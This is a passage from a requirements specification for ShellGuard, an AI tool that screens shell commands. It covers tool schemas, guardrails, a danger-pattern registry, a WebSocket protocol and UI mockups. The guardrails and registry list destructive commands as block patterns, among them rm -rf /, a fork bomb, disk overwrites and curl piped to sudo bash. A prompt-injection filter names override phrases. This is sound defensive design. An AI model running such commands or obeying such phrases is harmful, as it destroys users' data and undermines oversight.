│ /var/log │ System log directory (important system data) │
│ /nginx/ │ Nginx web server logs specifically │
│ \*.log │ All files ending in .log (wildcard match) │
└──────────┴──────────────────────────────────────────────┘

In Plain English:
"Permanently delete all .log files from the nginx log
directory, without asking for confirmation. This affects
access logs, error logs, and any rotated log files." 5. Non-Functional Requirements
5.1 Performance
NFR-001: Safe Command Latency

Safe commands (no risk pattern detected) SHALL be forwarded to the PTY within 5ms
The user SHALL perceive zero delay for safe commands
NFR-002: Pattern Matching Latency

Tier 1 pattern matching SHALL complete within 10ms for any command
NFR-003: AI Analysis Latency

Tier 2 AI analysis SHALL complete within 5 seconds (95th percentile)
The system SHALL show a loading indicator after 200ms of analysis time
NFR-004: Terminal Responsiveness

Keystroke-to-display latency SHALL be under 50ms
Terminal output SHALL stream with under 50ms latency
Terminal resize SHALL take effect within 100ms
NFR-005: WebSocket Throughput

The WebSocket connection SHALL handle at least 100 messages/second in each direction
The system SHALL handle large command outputs (e.g., cat of large file) without blocking
5.2 Reliability
NFR-010: Terminal Stability

The terminal session SHALL NOT crash due to any user input
If the PTY process dies, the system SHALL detect it and offer to restart
If the WebSocket disconnects, the system SHALL attempt reconnection with exponential backoff
NFR-011: Analysis Fallback

If the LLM API is unavailable, the system SHALL fall back to pattern-matching-only mode
The system SHALL clearly indicate when operating in degraded mode
Pattern matching SHALL continue to function offline
NFR-012: Graceful Error Handling

All errors SHALL be caught and displayed as user-friendly messages
API errors SHALL NOT leak stack traces to the frontend
The terminal SHALL remain functional even if the analysis pipeline fails
5.3 Usability
NFR-020: Zero-Configuration Start

The user SHALL be able to start using ShellGuard by navigating to the web URL
No shell configuration changes (.bashrc, .zshrc) SHALL be required
The terminal SHALL start with a standard bash prompt
NFR-021: Minimal Workflow Disruption

Safe commands SHALL execute with zero perceived disruption
The warning overlay SHALL not appear for safe commands
The warning overlay SHALL be dismissable with keyboard shortcuts:
Enter — Approve
S — Use Safe Alternative
Escape — Cancel
NFR-022: Visual Clarity

Risk levels SHALL be clearly distinguishable by color:
Critical: Red
High: Orange
Medium: Yellow
Low: Blue
Safe: Green (no warning shown)
The command under analysis SHALL be clearly highlighted
The safe alternative SHALL be visually distinct from the dangerous command
NFR-023: Dark Theme

The entire application SHALL use a dark color scheme appropriate for terminal environments
The UI SHALL maintain WCAG AA contrast ratios despite the dark theme
5.4 Maintainability
NFR-030: Pattern Registry Extensibility

Adding new dangerous command patterns SHALL require only modifying a data file (Python dict or JSON)
No code changes SHALL be needed to add new patterns
Patterns SHALL support regex for flexible matching
NFR-031: Modular Architecture

The analysis pipeline SHALL be modular: pattern matcher and AI analyzer can be replaced/upgraded independently
The frontend terminal and analysis panel SHALL be independent React components
The backend WebSocket handler, interceptor, and analyzer SHALL be separate modules 6. Archestra Integration Strategy
6.1 Integration Summary
Archestra Feature ShellGuard Usage Points Impact
MCP-Based Agent Orchestration 3 MCP tools: analyze_command, suggest_alternative, explain_command Critical
Centralized Runtime All agent executions run within Archestra runtime Critical
Security Guardrails Core product feature — command safety checking, alternative validation, catastrophic command blocking Maximum (guardrails ARE the product)
Observability Command analysis traces, risk metrics, token usage, latency tracking High
Deployment Deploy via Archestra deployment High
6.2 MCP Tool Definitions
YAML

tools:

# ============================================

# TOOL 1: Command Risk Analyzer

# ============================================

- name: "analyze_command"
  description: >
  Analyzes a shell command for safety risks. Evaluates the command's
  potential for data loss, service disruption, and system damage.
  Returns a comprehensive risk assessment with scoring.
  input_schema:
  type: object
  properties:
  command:
  type: string
  description: "The shell command to analyze"
  working_directory:
  type: string
  description: "Current working directory for context"
  default: "~"
  user:
  type: string
  description: "The user executing the command (e.g., root, ubuntu)"
  default: "user"
  shell:
  type: string
  description: "The shell type (bash, zsh, sh)"
  default: "bash"
  preliminary_risk:
  type: string
  description: "Risk level from pattern matching (medium, high, critical)"
  enum: ["medium", "high", "critical"]
  required: ["command"]
  output_schema:
  type: object
  properties:
  risk_level:
  type: string
  enum: ["critical", "high", "medium", "low"]
  risk_score:
  type: integer
  minimum: 0
  maximum: 100
  allow:
  type: boolean
  description: "Whether the AI recommends allowing this command"
  title:
  type: string
  description: "Short risk title"
  explanation:
  type: string
  description: "Detailed explanation of what the command does and why it's risky"
  consequences:
  type: array
  items:
  type: string
  description: "List of potential consequences"
  data_loss_risk:
  type: integer
  minimum: 0
  maximum: 100
  service_impact_risk:
  type: integer
  minimum: 0
  maximum: 100
  reversibility:
  type: integer
  minimum: 0
  maximum: 100
  description: "100 = fully reversible, 0 = irreversible"
  requires_sudo:
  type: boolean
  affected_scope:
  type: string
  description: "What files/services/systems are affected"
  command_breakdown:
  type: array
  items:
  type: object
  properties:
  part:
  type: string
  meaning:
  type: string
  risk_contribution:
  type: string

# ============================================

# TOOL 2: Safe Alternative Suggester

# ============================================

- name: "suggest_alternative"
  description: >
  Given a dangerous shell command, suggests a safer alternative
  that achieves a similar goal without the associated risks.
  input_schema:
  type: object
  properties:
  command:
  type: string
  description: "The dangerous command"
  risk_analysis:
  type: object
  description: "The risk analysis from analyze_command"
  intent:
  type: string
  description: "The user's probable intent (inferred)"
  required: ["command"]
  output_schema:
  type: object
  properties:
  safer_alternative:
  type: string
  description: "The safer command"
  alternative_explanation:
  type: string
  description: "Why this alternative is safer"
  intent_preserved:
  type: boolean
  description: "Whether the alternative achieves the same goal"
  risk_reduction:
  type: string
  description: "How much risk is reduced"

# ============================================

# TOOL 3: Command Explainer

# ============================================

- name: "explain_command"
  description: >
  Provides a detailed, beginner-friendly explanation of a shell
  command, breaking down each flag, argument, and operation.
  input_schema:
  type: object
  properties:
  command:
  type: string
  description: "The command to explain"
  required: ["command"]
  output_schema:
  type: object
  properties:
  plain_english:
  type: string
  description: "One-sentence plain English summary"
  breakdown:
  type: array
  items:
  type: object
  properties:
  component:
  type: string
  meaning:
  type: string
  risk_note:
  type: string
  affected_resources:
  type: array
  items:
  type: string
  description: "Files, directories, services affected"
  reversible:
  type: boolean
  undo_command:
  type: string
  description: "How to undo the command (if possible)"
  6.3 Archestra Agent Orchestration Workflow
  text

User submits command
│
▼
┌─────────────────────────────────────────────────────────┐
│ ARCHESTRA MCP COORDINATOR │
│ │
│ Step 1: Pattern Check (local, no MCP) │
│ ├── safe → execute immediately │
│ └── risky → continue to Step 2 │
│ │
│ Step 2: Invoke "analyze_command" MCP Tool │
│ ├── Input: command, directory, user │
│ ├── LLM processes via Archestra Runtime │
│ └── Output: full risk analysis │
│ │
│ Step 3: Apply Guardrails to Analysis Output │
│ ├── Validate risk_level is valid │
│ ├── Check alternative isn't also dangerous │
│ └── Sanitize any PII in explanation │
│ │
│ Step 4: Invoke "suggest_alternative" MCP Tool │
│ ├── Input: command + analysis │
│ └── Output: safer alternative + explanation │
│ │
│ Step 5: Apply Guardrails to Alternative │
│ ├── Run alternative through pattern matcher │
│ ├── Verify it's actually safer │
│ └── Block if alternative is also dangerous │
│ │
│ Step 6: Return combined result to frontend │
│ Record trace via Archestra Observability │
└─────────────────────────────────────────────────────────┘
6.4 Security Guardrails Configuration
YAML

guardrails:

# ============================================

# INPUT GUARDRAILS

# ============================================

input: - name: "command_length_limit"
description: "Reject absurdly long commands (potential attack)"
rule: "len(input.command) <= 10000"
action: "reject"
message: "Command exceeds maximum length"

    - name: "prompt_injection_prevention"
      description: "Prevent prompt injection through crafted commands"
      rule: "no_prompt_injection_patterns(input.command)"
      action: "sanitize"
      patterns:
        - "ignore previous instructions"
        - "you are now"
        - "system prompt"
        - "ASSISTANT:"
        - "\\n\\nHuman:"

    - name: "encoding_attack_prevention"
      description: "Prevent unicode/encoding-based attacks"
      rule: "is_valid_shell_input(input.command)"
      action: "sanitize"

# ============================================

# OUTPUT GUARDRAILS

# ============================================

output: - name: "alternative_safety_validation"
description: "Ensure the 'safer alternative' is actually safer"
rule: "pattern_risk(output.safer_alternative) < pattern_risk(input.command)"
action: "modify"
fallback:
safer_alternative: null
alternative_explanation: "No safe alternative could be verified. Consider manual approach."

    - name: "no_dangerous_alternatives"
      description: "Block alternatives that contain known dangerous patterns"
      rule: "not contains_critical_pattern(output.safer_alternative)"
      action: "block_alternative"

    - name: "explanation_completeness"
      description: "Ensure explanations are substantive"
      rule: "len(output.explanation) >= 50"
      action: "retry"
      max_retries: 1

    - name: "risk_score_bounds"
      description: "Ensure risk scores are within valid range"
      rule: "0 <= output.risk_score <= 100"
      action: "clamp"

    - name: "pii_scrubbing"
      description: "Remove any PII from AI output"
      rule: "scrub_pii(output)"
      action: "sanitize"
      patterns: ["email", "ip_address_private", "api_key", "password_hash"]

# ============================================

# CATASTROPHIC COMMAND BLOCKLIST

# ============================================

hard_blocks: - pattern: 'rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]\*\s+/'
is_regex: true
message: "⛔ BLOCKED: Recursive force delete on root filesystem"

    - pattern: ':\(\)\{\s*:\|:&\s*\}\s*;:'
      is_regex: true
      message: "⛔ BLOCKED: Fork bomb detected"

    - pattern: 'dd\s+if=/dev/zero\s+of=/dev/sd'
      is_regex: true
      message: "⛔ BLOCKED: Writing zeros to block device"

    - pattern: 'mv\s+/\s+/dev/null'
      is_regex: true
      message: "⛔ BLOCKED: Moving root filesystem to null device"

    - pattern: 'chmod\s+-R\s+777\s+/'
      is_regex: true
      message: "⛔ BLOCKED: Making entire filesystem world-writable"

    - pattern: '>\s*/dev/sda'
      is_regex: true
      message: "⛔ BLOCKED: Redirecting output to block device"

    - pattern: 'wget.*\|\s*sudo\s+bash'
      is_regex: true
      message: "⛔ BLOCKED: Piping remote script to sudo bash"

    - pattern: 'curl.*\|\s*sudo\s+bash'
      is_regex: true
      message: "⛔ BLOCKED: Piping remote content to sudo bash"

6.5 Observability Configuration
YAML

observability:

# ============================================

# TRACING

# ============================================

tracing:
enabled: true
trace_all_commands: true
trace_details: - command_text: true - risk_assessment: true - user_decision: true - analysis_duration: true - agent_invocations: true

    # Each intercepted command creates a trace span
    span_attributes:
      - "shellguard.command"
      - "shellguard.risk_level"
      - "shellguard.action"
      - "shellguard.analysis_latency_ms"
      - "shellguard.pattern_matched"
      - "shellguard.ai_invoked"

# ============================================

# METRICS

# ============================================

metrics: - name: "shellguard_commands_total"
type: "counter"
description: "Total commands processed"
labels: ["risk_level", "action"] # action: executed, approved, safe_swap, cancelled, blocked

    - name: "shellguard_interceptions_total"
      type: "counter"
      description: "Total commands intercepted (warned or blocked)"
      labels: ["risk_level", "trigger"]
      # trigger: pattern_match, ai_analysis

    - name: "shellguard_safe_swaps_total"
      type: "counter"
      description: "Times user chose the safer alternative"

    - name: "shellguard_analysis_duration_seconds"
      type: "histogram"
      description: "Time taken for command analysis"
      buckets: [0.01, 0.05, 0.1, 0.5, 1.0, 2.0, 5.0, 10.0]
      labels: ["tier"]
      # tier: pattern_only, ai_analysis

    - name: "shellguard_llm_tokens_total"
      type: "counter"
      description: "LLM tokens consumed for analysis"
      labels: ["model", "type"]
      # type: prompt, completion

    - name: "shellguard_risk_score_distribution"
      type: "histogram"
      description: "Distribution of risk scores for analyzed commands"
      buckets: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]

    - name: "shellguard_pattern_matches_total"
      type: "counter"
      description: "Commands matching each danger pattern"
      labels: ["pattern_category"]
      # pattern_category: recursive_delete, fork_bomb, permission_change, etc.

    - name: "shellguard_active_sessions"
      type: "gauge"
      description: "Currently active terminal sessions"

    - name: "shellguard_session_duration_seconds"
      type: "histogram"
      description: "Terminal session duration"
      buckets: [60, 300, 600, 1800, 3600, 7200]

# ============================================

# LOGGING

# ============================================

logging:
level: "INFO"
format: "json"
include_trace_id: true
sensitive_fields_redacted: - "command" # Log hash only in production, full in dev 7. Data Requirements
7.1 Data Models
Python

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional, List, Dict, Any
from uuid import UUID, uuid4

class RiskLevel(str, Enum):
SAFE = "safe"
LOW = "low"
MEDIUM = "medium"
HIGH = "high"
CRITICAL = "critical"

class CommandAction(str, Enum):
EXECUTED = "executed" # Safe command, ran normally
APPROVED = "approved" # Risky command, user approved
SAFE_SWAP = "safe_swap" # User chose safer alternative
CANCELLED = "cancelled" # User cancelled
BLOCKED = "blocked" # Hard-blocked, cannot execute

@dataclass
class CommandBreakdown:
part: str # e.g., "-rf"
meaning: str # e.g., "recursive + force"
risk_contribution: str # e.g., "Prevents safety prompts"

@dataclass
class RiskAnalysis:
risk_level: RiskLevel
risk_score: int # 0-100
allow: bool # AI recommendation
title: str # Short risk title
explanation: str # Detailed explanation
consequences: List[str] # Potential consequences
safer_alternative: Optional[str]
alternative_explanation: Optional[str]
data_loss_risk: int # 0-100
service_impact_risk: int # 0-100
reversibility: int # 0-100
requires_sudo: bool
affected_scope: str
command_breakdown: List[CommandBreakdown]
analysis_source: str # "pattern" | "ai" | "hard_block"
model_used: Optional[str] # LLM model if AI was used
tokens_used: int = 0
analysis_latency_ms: int = 0

@dataclass
class CommandLogEntry:
id: UUID = field(default_factory=uuid4)
session_id: UUID = field(default_factory=uuid4)
command: str = ""
timestamp: datetime = field(default_factory=datetime.utcnow)
risk_level: RiskLevel = RiskLevel.SAFE
action: CommandAction = CommandAction.EXECUTED
analysis: Optional[RiskAnalysis] = None
alternative_used: Optional[str] = None
working_directory: str = "~"
analysis_latency_ms: int = 0

@dataclass
class SessionStats:
session_id: UUID
total_commands: int = 0
safe_commands: int = 0
warnings_issued: int = 0
approved_risky: int = 0
safe_swaps: int = 0
cancelled: int = 0
blocked: int = 0
total_tokens_used: int = 0
session_start: datetime = field(default_factory=datetime.utcnow)

    @property
    def interception_rate(self) -> float:
        if self.total_commands == 0:
            return 0.0
        return (self.warnings_issued + self.blocked) / self.total_commands * 100

    @property
    def safe_swap_rate(self) -> float:
        if self.warnings_issued == 0:
            return 0.0
        return self.safe_swaps / self.warnings_issued * 100

@dataclass
class DangerPattern:
pattern: str # String or regex pattern
is_regex: bool = False # Whether pattern is regex
risk_level: RiskLevel = RiskLevel.HIGH
category: str = "" # e.g., "recursive_delete", "fork_bomb"
description: str = "" # Human-readable description
hard_block: bool = False # If true, block without AI analysis
block_message: str = "" # Message shown for hard blocks
7.2 Database Schema
SQL

-- Session tracking
CREATE TABLE sessions (
id TEXT PRIMARY KEY,
started_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
ended_at TIMESTAMP,
total_commands INTEGER DEFAULT 0,
total_interceptions INTEGER DEFAULT 0,
total_safe_swaps INTEGER DEFAULT 0
);

-- Command history and audit log
CREATE TABLE command_log (
id TEXT PRIMARY KEY,
session_id TEXT NOT NULL REFERENCES sessions(id),
command TEXT NOT NULL,
timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
risk_level TEXT NOT NULL DEFAULT 'safe',
action TEXT NOT NULL DEFAULT 'executed',
risk_score INTEGER,
risk_title TEXT,
explanation TEXT,
consequences TEXT, -- JSON array
safer_alternative TEXT,
alternative_used TEXT,
data_loss_risk INTEGER,
service_impact_risk INTEGER,
reversibility INTEGER,
working_directory TEXT,
analysis_source TEXT, -- 'pattern' | 'ai' | 'hard_block'
model_used TEXT,
tokens_used INTEGER DEFAULT 0,
analysis_latency_ms INTEGER DEFAULT 0,
full_analysis TEXT -- JSON blob of complete analysis
);

-- Indexes for fast queries
CREATE INDEX idx_command_log_session ON command_log(session_id);
CREATE INDEX idx_command_log_timestamp ON command_log(timestamp DESC);
CREATE INDEX idx_command_log_risk ON command_log(risk_level);
CREATE INDEX idx_command_log_action ON command_log(action);

-- Aggregate stats (materialized for dashboard)
CREATE TABLE daily_stats (
date TEXT PRIMARY KEY, -- YYYY-MM-DD
total_commands INTEGER DEFAULT 0,
safe_commands INTEGER DEFAULT 0,
interceptions INTEGER DEFAULT 0,
safe_swaps INTEGER DEFAULT 0,
approved INTEGER DEFAULT 0,
cancelled INTEGER DEFAULT 0,
blocked INTEGER DEFAULT 0,
total_tokens INTEGER DEFAULT 0
);
7.3 Dangerous Command Pattern Registry
Python

DANGER_PATTERNS = { # ============================================ # CRITICAL — Hard Block (no AI needed) # ============================================
"critical": [
{
"pattern": r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]_\s+/\s_$",
            "is_regex": True,
            "category": "filesystem_destruction",
            "description": "Recursive force delete on root filesystem",
            "hard_block": True,
            "block_message": "This command would permanently destroy your entire filesystem."
        },
        {
            "pattern": ":(){ :|:& };:",
            "is_regex": False,
            "category": "fork_bomb",
            "description": "Fork bomb — will crash the system by spawning infinite processes",
            "hard_block": True,
            "block_message": "Fork bomb detected. This would crash your system immediately."
        },
        {
            "pattern": r"dd\s+if=/dev/(zero|random|urandom)\s+of=/dev/sd[a-z]",
            "is_regex": True,
            "category": "disk_destruction",
            "description": "Writing random/zero data to disk — destroys all data",
            "hard_block": True,
            "block_message": "This would overwrite your disk, destroying all data irreversibly."
        },
        {
            "pattern": r"mv\s+/\s+/dev/null",
            "is_regex": True,
            "category": "filesystem_destruction",
            "description": "Moving root filesystem to null device",
            "hard_block": True,
            "block_message": "This would effectively delete your entire filesystem."
        },
        {
            "pattern": r"chmod\s+-R\s+777\s+/\s*$",
"is_regex": True,
"category": "permission_catastrophe",
"description": "Making entire filesystem world-writable",
"hard_block": True,
"block_message": "This would remove all security permissions from every file on the system."
},
{
"pattern": r">\s\*/dev/sd[a-z]",
"is_regex": True,
"category": "disk_destruction",
"description": "Redirecting output directly to block device",
"hard_block": True,
"block_message": "This would corrupt your disk's data."
},
],

    # ============================================
    # HIGH — AI Analysis Required
    # ============================================
    "high": [
        {
            "pattern": r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f",
            "is_regex": True,
            "category": "recursive_delete",
            "description": "Recursive force delete"
        },
        {
            "pattern": r"rm\s+-[a-zA-Z]*r",
            "is_regex": True,
            "category": "recursive_delete",
            "description": "Recursive delete"
        },
        {
            "pattern": r"(DROP|drop)\s+(TABLE|DATABASE|SCHEMA)",
            "is_regex": True,
            "category": "database_destruction",
            "description": "Database structure deletion"
        },
        {
            "pattern": r"kill\s+-9",
            "is_regex": True,
            "category": "process_kill",
            "description": "Force kill process (no cleanup)"
        },
        {
            "pattern": r"killall",
            "is_regex": True,
            "category": "process_kill",
            "description": "Kill all processes by name"
        },
        {
            "pattern": r"curl\s+.*\|\s*(sudo\s+)?bash",
            "is_regex": True,
            "category": "untrusted_execution",
            "description": "Piping remote content to bash"
        },
        {
            "pattern": r"wget\s+.*\|\s*(sudo\s+)?sh",
            "is_regex": True,
            "category": "untrusted_execution",
            "description": "Piping downloaded content to shell"
        },
        {
            "pattern": r"(shutdown|reboot|halt|poweroff)",
            "is_regex": True,
            "category": "system_control",
            "description": "System shutdown/reboot"
        },
        {
            "pattern": r"init\s+[06]",
            "is_regex": True,
            "category": "system_control",
            "description": "System runlevel change (shutdown/reboot)"
        },
        {
            "pattern": r"chmod\s+777",
            "is_regex": True,
            "category": "permission_change",
            "description": "Making files world-writable"
        },
        {
            "pattern": r"TRUNCATE\s+TABLE",
            "is_regex": True,
            "category": "database_destruction",
            "description": "Truncating database table"
        },
    ],

    # ============================================
    # MEDIUM — AI Analysis Recommended
    # ============================================
    "medium": [
        {
            "pattern": r"chmod\s+",
            "is_regex": True,
            "category": "permission_change",
            "description": "Permission modification"
        },
        {
            "pattern": r"chown\s+-R",
            "is_regex": True,
            "category": "ownership_change",
            "description": "Recursive ownership change"
        },
        {
            "pattern": r"iptables\s+-F",
            "is_regex": True,
            "category": "firewall_change",
            "description": "Flushing firewall rules"
        },
        {
            "pattern": r"ufw\s+disable",
            "is_regex": True,
            "category": "firewall_change",
            "description": "Disabling firewall"
        },
        {
            "pattern": r"systemctl\s+(stop|disable|mask)",
            "is_regex": True,
            "category": "service_management",
            "description": "Stopping or disabling system service"
        },
        {
            "pattern": r"service\s+\S+\s+stop",
            "is_regex": True,
            "category": "service_management",
            "description": "Stopping system service"
        },
        {
            "pattern": r"docker\s+(system\s+prune|rm|rmi)",
            "is_regex": True,
            "category": "container_cleanup",
            "description": "Docker resource removal"
        },
        {
            "pattern": r"apt\s+(remove|purge)",
            "is_regex": True,
            "category": "package_removal",
            "description": "Package removal"
        },
        {
            "pattern": r"pip\s+uninstall",
            "is_regex": True,
            "category": "package_removal",
            "description": "Python package removal"
        },
        {
            "pattern": r"npm\s+uninstall",
            "is_regex": True,
            "category": "package_removal",
            "description": "Node package removal"
        },
        {
            "pattern": r"git\s+push\s+.*--force",
            "is_regex": True,
            "category": "git_destructive",
            "description": "Force push to git remote"
        },
        {
            "pattern": r"git\s+reset\s+--hard",
            "is_regex": True,
            "category": "git_destructive",
            "description": "Hard reset git history"
        },
        {
            "pattern": r"git\s+clean\s+-[a-zA-Z]*f",
            "is_regex": True,
            "category": "git_destructive",
            "description": "Force clean untracked git files"
        },
    ],

    # ============================================
    # LOW — Log Only, No Warning
    # ============================================
    "low": [
        {
            "pattern": r"sudo\s+",
            "is_regex": True,
            "category": "elevated_privilege",
            "description": "Running with elevated privileges"
        },
        {
            "pattern": r"(vim|nano|vi)\s+/etc/",
            "is_regex": True,
            "category": "config_edit",
            "description": "Editing system configuration file"
        },
    ]

} 8. External Interface Requirements
8.1 WebSocket Protocol
Endpoint: ws://host:8000/ws/terminal

8.1.1 Client → Server Messages
TypeScript

// Keystroke input
{ "type": "input", "data": "a" }
{ "type": "input", "data": "\r" } // Enter
{ "type": "input", "data": "\x7f" } // Backspace
{ "type": "input", "data": "\x03" } // Ctrl+C

// User decisions on warnings
{ "type": "approve" }
{ "type": "use_alternative", "command": "find /var/logs -name '\*.log' -mtime +30 -delete" }
{ "type": "cancel" }
{ "type": "explain_more" }

// Terminal resize
{ "type": "resize", "rows": 24, "cols": 80 }

// Ping (keepalive)
{ "type": "ping" }
8.1.2 Server → Client Messages
TypeScript

// Terminal output (raw PTY output)
{ "type": "output", "data": "user@server:~$ " }

// Analysis in progress
{
"type": "analyzing",
"command": "rm -rf /var/logs"
}

// Warning (risky command detected)
{
"type": "warning",
"command": "rm -rf /var/logs",
"analysis": {
"risk_level": "high",
"risk_score": 78,
"allow": false,
"title": "Recursive Force Delete",
"explanation": "This command will permanently delete the /var/logs directory...",
"consequences": [
"All log files will be permanently deleted",
"Running services may crash when they cannot write logs",
"Forensic/debugging data will be lost"
],
"safer_alternative": "find /var/logs -name '\*.log' -mtime +30 -delete",
"alternative_explanation": "Deletes only .log files older than 30 days, preserving recent logs",
"data_loss_risk": 85,
"service_impact_risk": 60,
"reversibility": 10,
"requires_sudo": false,
"affected_scope": "/var/logs directory and all subdirectories",
"command_breakdown": [
{ "part": "rm", "meaning": "Remove (delete) files", "risk_contribution": "Base delete operation" },
{ "part": "-r", "meaning": "Recursive: includes directories", "risk_contribution": "Expands scope to all subdirectories" },
{ "part": "-f", "meaning": "Force: no confirmation", "risk_contribution": "Removes safety prompts" },
{ "part": "/var/logs", "meaning": "System log directory", "risk_contribution": "Critical system directory" }
]
}
}

// Hard block (catastrophic command)
{
"type": "blocked",
"command": "rm -rf /",
"message": "⛔ BLOCKED: Recursive force delete on root filesystem",
"explanation": "This command would permanently destroy your entire filesystem. ShellGuard cannot allow this command under any circumstances.",
"risk_level": "critical"
}

// Command explanation (response to explain_more)
{
"type": "explanation",
"command": "rm -rf /var/logs",
"breakdown": [
{ "component": "rm", "meaning": "Remove/delete files or directories", "risk_note": "Permanent deletion" },
{ "component": "-r", "meaning": "Recursive — process directories and their contents", "risk_note": "Affects entire directory tree" },
{ "component": "-f", "meaning": "Force — ignore nonexistent files, never prompt", "risk_note": "No safety confirmation" },
{ "component": "/var/logs", "meaning": "System logs directory", "risk_note": "Contains important system and application logs" }
],
"plain_english": "Permanently delete the entire /var/logs directory and everything inside it, without asking for confirmation.",
"affected_resources": ["/var/logs/*", "syslog", "auth.log", "nginx logs", "application logs"],
"reversible": false,
"undo_command": null
}

// Session stats update
{
"type": "stats_update",
"stats": {
"total_commands": 24,
"safe_commands": 19,
"warnings_issued": 4,
"approved_risky": 1,
"safe_swaps": 2,
"cancelled": 1,
"blocked": 1,
"interception_rate": 20.8,
"safe_swap_rate": 50.0
}
}

// Pong (keepalive response)
{ "type": "pong" }

// Error
{ "type": "error", "message": "Analysis service temporarily unavailable. Pattern matching is still active." }
8.2 REST API
Method Endpoint Description Response
GET /api/health System health check HealthStatus
GET /api/stats Current session + all-time stats StatsResponse
GET /api/history Paginated command history PaginatedHistory
GET /api/history?risk_level=high&action=approved Filtered history PaginatedHistory
GET /api/patterns List all danger patterns PatternList
GET /api/dashboard/summary Dashboard summary data DashboardSummary
GET /api/dashboard/risk-distribution Risk distribution data RiskDistribution
GET /api/dashboard/timeline Command timeline data TimelineData
GET /api/dashboard/top-dangerous Most common dangerous commands TopDangerous
8.3 LLM Provider Interface
Python

from abc import ABC, abstractmethod
from typing import Dict, Any

class LLMProvider(ABC):
@abstractmethod
async def analyze_command(
self,
command: str,
context: Dict[str, Any],
system_prompt: str,
) -> Dict[str, Any]:
"""Analyze a command and return structured risk assessment"""
pass

class OpenAIProvider(LLMProvider):
"""OpenAI GPT-4o-mini implementation"""

    MODEL = "gpt-4o-mini"  # Fast + cheap for classification
    FALLBACK_MODEL = "gpt-4o"  # Higher quality fallback

    async def analyze_command(self, command, context, system_prompt):
        response = await self.client.chat.completions.create(
            model=self.MODEL,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": f"Analyze: {command}\nContext: {context}"}
            ],
            response_format={"type": "json_object"},
            temperature=0.1,
            max_tokens=800,
        )
        return json.loads(response.choices[0].message.content)

9. User Interface Requirements
   9.1 Main Layout
   text

┌──────────────────────────────────────────────────────────────────────────────┐
│ 🛡️ ShellGuard AI Terminal Safety Copilot │ Cmds: 24 │ ⚠️ 5 │ 🔄 2 │ ⚙️│
├──────────────────────────────────────────┬───────────────────────────────────┤
│ │ │
│ TERMINAL AREA │ SIDE PANEL │
│ (xterm.js - 60% width) │ (40% width, tabbed) │
│ │ │
│ user@server:~$ ls -la │ [Analysis] [History] [Stats] │
│ total 48 │ │
│ drwxr-xr-x 5 user user 4096 ... │ ┌─────────────────────────────┐ │
│ -rw-r--r-- 1 user user 220 ... │ │ Last Analysis │ │
│ │ │ │ │
│ user@server:~$ cd /var/logs │ │ Command: rm -rf /var/logs │ │
│ user@server:/var/logs$ rm -rf _ │ │ Risk: ████████░░ HIGH (78) │ │
│ │ │ │ │
│ ┌─────────────────────────────────────┐ │ │ Data Loss: ████████░░ │ │
│ │ ⚠️ Analyzing command safety... │ │ │ Service: ██████░░░░ │ │
│ └─────────────────────────────────────┘ │ │ Irreversible: █████████░ │ │
│ │ │ │ │
│ OR │ │ Category: recursive_delete │ │
│ │ │ Source: AI analysis │ │
│ ┌─────────────────────────────────────┐ │ │ Latency: 1.2s │ │
│ │ │ │ │ Tokens: 342 │ │
│ │ ⚠️ ShellGuard Warning │ │ └─────────────────────────────┘ │
│ │ ────────────────────── │ │ │
│ │ Risk: HIGH (78/100) │ │ ───────────────────────────── │
│ │ │ │ │
│ │ "Recursive Force Delete" │ │ Recent Commands: │
│ │ │ │ ✅ ls -la 2s ago │
│ │ This will permanently delete... │ │ ✅ cd /var/logs 5s ago │
│ │ │ │ ⚠️ rm -rf _ just now │
│ │ ▶ Consequences: │ │ ✅ pwd 1m ago │
│ │ • All files permanently deleted │ │ ✅ echo hello 1m ago │
│ │ • Running services may crash │ │ 🔴 chmod 777 /etc 3m ago │
│ │ │ │ │
│ │ ─── Risk Breakdown ─── │ │ │
│ │ Data Loss ████████░░ 85% │ │ │
│ │ Service ██████░░░░ 60% │ │ │
│ │ Irreversible █████████░ 90% │ │ │
│ │ │ │ │
│ │ ✅ Safer Alternative: │ │ │
│ │ ┌──────────────────────────────┐ │ │ │
│ │ │ find . -name "\*.log" │ │ │ │
│ │ │ -mtime +30 -delete │ │ │ │
│ │ └──────────────────────────────┘ │ │ │
│ │ Deletes only .log files older │ │ │
│ │ than 30 days │ │ │
│ │ │ │ │
│ │ [✅ Approve] [🔄 Use Safe] [❌ Cancel]│ │ │
│ └─────────────────────────────────────┘ │ │
│ │ │
└──────────────────────────────────────────┴───────────────────────────────────┘
9.2 Dashboard Page (/dashboard)
text

┌──────────────────────────────────────────────────────────────────────────────┐
│ 🛡️ ShellGuard [Terminal] [Dashboard] ⚙️ │
├──────────────────────────────────────────────────────────────────────────────┤
│ │
│ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ │
│ │ 156 │ │ 23 │ │ 65% │ │ 1.8s │ │
│ │ Total │ │ Interceptions│ │ Safe Swap │ │ Avg Analysis│ │
│ │ Commands │ │ │ │ Rate │ │ Latency │ │
│ └──────────────┘ └──────────────┘ └──────────────┘ └──────────────┘ │
│ │
│ ┌────────────────────────────────┐ ┌────────────────────────────────────┐ │
│ │ Risk Distribution │ │ Commands Over Time │ │
│ │ │ │ │ │
│ │ ┌──┐ │ │ ╭──╮ │ │
│ │ │ │ │ │ ╱ ╲ ╭──╮ │ │
│ │ │ │ ┌──┐ │ │ ╱ ╲ ╱ ╲ │ │
│ │ │ │ │ │ ┌──┐ │ │ ╱ ╲─╱ ╲── │ │
│ │ ┌──┤ │ │ │ │ │ ┌──┐ │ │ │ │
│ │ │ │ │ │ │ │ │ │ │ │ │ ── Total ── Intercepted │ │
│ │ Safe High Med Low Crit │ │ │ │
│ └────────────────────────────────┘ └────────────────────────────────────┘ │
│ │
│ ┌───────────────────────────────────────────────────────────────────────┐ │
│ │ Most Common Dangerous Commands │ │
│ │ │ │
│ │ 1. rm -rf ██████████████████████████░░░░ 12 times │ │
│ │ 2. chmod 777 ████████████████░░░░░░░░░░░░░ 8 times │ │
│ │ 3. kill -9 ██████████░░░░░░░░░░░░░░░░░░░ 5 times │ │
